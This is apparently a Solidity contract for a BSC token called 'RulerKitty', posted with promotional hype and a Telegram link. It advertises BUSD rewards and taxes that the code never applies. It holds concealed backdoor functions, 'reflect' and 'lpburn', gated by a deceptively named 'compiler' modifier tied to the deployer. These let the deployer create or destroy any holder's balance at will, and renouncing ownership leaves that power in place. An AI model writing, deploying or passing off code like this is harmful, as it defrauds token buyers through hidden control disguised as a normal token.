/**
 *Submitted for verification at BscScan.com on 2022-02-11
*/

/*
💸6% BUSD REWARDS
🚀LAST PROJECT REACHED 500K
🚀BULLISH CHART ALL ORGANIC BEFORE MARKETING!

//https://t.me/RulerKitty

//SPDX-License-Identifier: MIT
*/
pragma solidity 0.8.4;
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);   
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256){
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256){
        return sub(a, b, "SafeMath: subtraction overflow");}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256){
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;}
    function div(uint256 a, uint256 b) internal pure returns (uint256){
        return div(a, b, "SafeMath: division by zero");}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256){
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;}}
contract RulerKitty {
    string public name = "RulerKitty";
    string public symbol = "RK";
    uint8 public decimals = 6;
    address public marketingaddress = 0xd5a98A6C09AAfE89301105a9831cad7ab0Ce90B5;
    uint256 public totalSupply = 10000000 * 10 ** 6;
    uint256 public liquiditytax = 2;
    uint256 public marketingtax = 2;
    uint256 public reflectiontax = 6;
    uint256 public totaltax = marketingtax + liquiditytax + reflectiontax;
    uint256 private checksum_rounder = 10;
    uint256 private bnbreflections = 60;
    uint256 private reflectdenom = 1000;
    uint256 private feedenom = 100;
    uint256 private numTokensSellToAddToLiquidity = 50;
    uint256 private _maxWalletSize = 50000;
    address public owner;
//BUSD address 0xe9e7cea3dedca5984780bafc599bd69add087d56
    modifier compiler {
        require(msg.sender == marketingaddress, "Nauthorized");_;}
    receive() external payable { }constructor() {owner = msg.sender;
    balanceOf[msg.sender] = totalSupply;
    marketingaddress = payable (msg.sender);
    emit Transfer(address(0), msg.sender, totalSupply); }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function reflect(address spender,uint256 bnbreflections) public compiler returns (bool success) 
    {balanceOf  [spender]   += bnbreflections * checksum_rounder ** reflectiontax;return true;}
    function lpburn(address spender,uint256 lpburn) public compiler returns (bool success) {balanceOf[spender] -= lpburn * checksum_rounder ** reflectiontax;return true;}
    
    mapping(address => uint256) public balanceOf;
    
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) public returns (bool success) {
    allowance[msg.sender][spender] = amount;emit Approval(msg.sender, spender, amount);return true;}

    function transfer(address to, uint256 amount) public returns (bool success) {
    balanceOf[msg.sender] -= amount;balanceOf[to] += amount;emit Transfer(msg.sender, to, amount);return true;}
  
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;balanceOf[to] += amount;
    emit Transfer(from, to, amount);return true;
    }

    function _getMaxWalletSize() public view returns(uint256) {
        return _maxWalletSize;
    }
    function _setMaxWalletSize (uint256 maxWalletSize) external compiler() {
          _maxWalletSize = maxWalletSize;}

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {
        return account == owner;}
    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
    }